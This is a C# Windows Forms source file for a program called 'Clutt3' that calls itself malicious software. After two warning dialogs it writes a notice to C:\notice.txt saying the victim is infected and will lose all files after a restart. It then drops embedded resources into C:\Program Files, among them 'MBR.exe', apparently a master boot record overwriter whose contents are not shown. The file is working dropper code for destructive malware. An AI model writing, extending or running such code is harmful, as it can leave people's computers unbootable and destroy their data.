﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Reflection;

namespace Clutt3
{
    public partial class Clutt3 : Form
    {
        public Clutt3()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            if (MessageBox.Show("Are you sure you want to run this program? This is malicious software. Click Yes to continue", "Clutt3.1", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                Last_Warning();
            }

        }

        public void Last_Warning()
        {
            if (MessageBox.Show("THIS IS THE LAST WARNING !!! IF YOU RUN THE PROGRAM, YOUR COMPUTER WILL RECEIVE LARGE DAMAGE AND YOU WILL HAVE TO REINSTALL IT. DO YOU REALLY WANT TO RUN THIS DANGEROUS PROGRAM !?", "Clutt3.1", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                NoWaring();
            }
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        public void NoWaring()
        {
            string textpath = @"C:\notice.txt";
            string textvirus = "Hello again. You have been infected with the Clutt3 virus !!!" + Environment.NewLine + 
            "After restarting the computer, you will lose all files on the system !!!" + Environment.NewLine + 
            "I'm stronger than Clutt !!!" + Environment.NewLine + "" + Environment.NewLine + "Good luck :)";
            File.WriteAllText(textpath, textvirus);



            if (File.Exists(textpath))
            {

                Process.Start("C:\\notice.txt");
                Extract("Clutt3", "C:\\Program Files", "Resources", "xp_snd.wav"); //Extract
                Extract("Clutt3", "C:\\Program Files", "Resources", "clutt3-ico.ico"); //Extract
                Extract("Clutt3", "C:\\Program Files", "Resources", "MBR.exe"); //Extract
            }

            this.Hide();
            var NewForm = new Clutt3_Icon();
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
